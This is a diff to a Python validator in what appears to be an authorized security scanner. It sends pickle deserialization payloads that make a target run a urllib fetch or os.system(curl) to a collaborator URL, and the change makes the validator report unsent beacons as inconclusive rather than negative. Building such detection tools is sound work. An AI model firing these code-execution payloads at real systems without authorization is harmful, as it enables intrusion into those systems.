@@ -96,6 +96,17 @@ def _pickle_payload(url: str, shell: bool = False) -> str:
     return base64.b64encode(pickle.dumps(obj)).decode()
 
 
+# A beacon whose connection never opened cannot have reached the target, so its
+# callback is not waited on. Any other transport failure (a read timeout after
+# the request was written) may have delivered it, so the callback window is
+# still waited (RV-P P3, the rule RV-O applies to SSRF). Inside a run the gated
+# client re-raises every transport error as ConnectError (safety_gate keeps only
+# the message), so there a failed beacon counts as unsent: inconclusive, never
+# a negative.
+_NEVER_SENT = (httpx.ConnectError, httpx.ConnectTimeout, httpx.PoolTimeout,
+               httpx.UnsupportedProtocol, httpx.LocalProtocolError)
+
+
 class DeserializationOobValidator(Validator):
     name = "deserialization_oob"
     finding_classes = {"deserialization", "insecure deserialization", "insecure_deserialization",
@@ -178,22 +189,32 @@ class DeserializationOobValidator(Validator):
 
         collab = self.collab()
         method = (exchange.method or "GET").upper()
+        # Beacons that got no response: a check whose beacon never reached the
+        # target is not a negative. The gate's refusal stops the remaining sends.
+        refused, unsent, timed_out, sends = "", [], [], 0
         for loc, name in sinks:
             for shell in (False, True):  # urlopen beacon first, then os.system(curl) fallback
+                if refused:
+                    break
                 token = collab.token()
                 payload = _pickle_payload(collab.url(token), shell=shell)
                 url, headers, body = self._mutate(exchange, loc, name, payload)
+                label = f"{loc} {name!r} ({'os.system' if shell else 'urllib'} beacon)"
+                sends += 1
                 try:
                     await global_throttle.acquire()
                     async with GatedAsyncClient(get_default_gate(), self.name, timeout=self.timeout,
                                                 follow_redirects=False, verify=False) as client:
                         await client.request(method, url, headers=headers or None,
                                              content=body or None)
-                except SafetyGateBlocked:
-                    return self._skip("mutating deserialization replay not authorized "
-                                      "(validators.allow_mutating_replay)")
-                except httpx.HTTPError:
+                except SafetyGateBlocked as e:
+                    refused = e.decision.reason
                     continue
+                except httpx.HTTPError as e:
+                    if isinstance(e, _NEVER_SENT):
+                        unsent.append(f"{label}: {e.__class__.__name__}")
+                        continue
+                    timed_out.append(f"{label}: {e.__class__.__name__}")
                 if await collab.wait_for_hit(token, timeout=self.timeout):
                     kind = "os.system(curl)" if shell else "urllib fetch"
                     return ValidationResult(
@@ -204,6 +225,21 @@ class DeserializationOobValidator(Validator):
                                  f"(pickle __reduce__ -> {kind} of a unique collaborator URL); the "
                                  f"target unpickled it and called back out-of-band. Proof of code "
                                  f"execution via deserialization -- no gadget chain, no destructive payload.")
+        unanswered = len(unsent) + len(timed_out) + (1 if refused else 0)
+        if unanswered:
+            answered = sends - unanswered
+            why = "; ".join(([f"refused by the safety gate ({refused})"] if refused else [])
+                            + (unsent + timed_out)[:3])
+            waited = (f" {len(timed_out)} beacon(s) whose response failed after sending were still "
+                      f"waited on without a hit." if timed_out else "")
+            return ValidationResult(
+                self.name, "blocked" if refused and not answered else "inconclusive", "deserialization",
+                confidence=0.0, confirmed=False,
+                summary=f"Deserialization check incomplete: {unanswered} of {sends} beacon send(s) got "
+                        f"no response ({why}); not a negative result",
+                evidence=f"Overwrote {len(sinks)} pickle-shaped sink(s) with a benign beacon payload; "
+                         f"{answered} answered beacon(s) drew no collaborator hit, but a beacon that "
+                         f"never reached the target cannot call back.{waited}")
         return ValidationResult(
             self.name, "not_confirmed", "deserialization", confidence=0.0, confirmed=False,
             summary="No out-of-band callback -- the pickle value does not appear to be deserialised unsafely",
